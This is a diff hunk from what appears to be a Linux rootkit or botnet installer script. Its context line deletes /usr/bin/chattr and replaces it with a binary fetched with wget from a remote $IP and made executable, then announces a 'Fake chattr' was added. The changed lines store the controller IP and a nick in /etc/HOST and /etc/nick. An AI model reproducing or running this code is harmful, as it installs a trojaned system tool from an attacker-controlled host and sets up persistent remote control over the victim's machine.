@@ -60,8 +60,8 @@ rm -rf /usr/bin/chattr && cd /usr/bin && wget http://$IP/chattr && chmod +x chat
 echo
 echo "------------------Fake chattr successfully added-----------------"
 echo "-----------------------------------------------------------------"
-echo "$IP" > /etc/HOST &
-echo "$nick" > /etc/nick &
+echo "$IP" > /etc/HOST 
+echo "$nick" > /etc/nick 
 echo
 echo "-----------------------------------------------------------------------------"
 echo "-----------------------------------------------------------------------------"
